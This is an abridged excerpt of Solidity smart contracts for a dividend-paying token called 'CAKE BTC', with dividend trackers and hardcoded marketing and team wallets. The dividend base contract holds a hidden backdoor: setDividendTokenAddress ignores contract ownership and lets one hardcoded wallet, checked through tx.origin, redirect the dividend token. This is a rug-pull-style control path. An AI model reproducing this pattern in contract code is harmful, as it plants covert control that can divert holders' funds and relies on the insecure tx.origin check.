...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xfD350e50B08e03081c53DF85548158080BC358d4, "Only owner can change dividend contract address");
...
contract BtcCake is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("CAKE BTC", "CBTC") {
    	ethDividendTracker = new EthDividendTracker();
    	cakeDividendTracker = new CakeDividendTracker();

    	marketingWallet = 0x89f3d78C180C8C5cc5C4da8714fb1cc7f3E728ac;
    	teamWallet = 0x8c05c728Ca714D30BBFF30Af4fD98e062e651336;
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("EtherBack_Ethereum_Dividend_Tracker", "EtherBack_Ethereum_Dividend_Tracker", 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) {
    	claimWait = 1800;
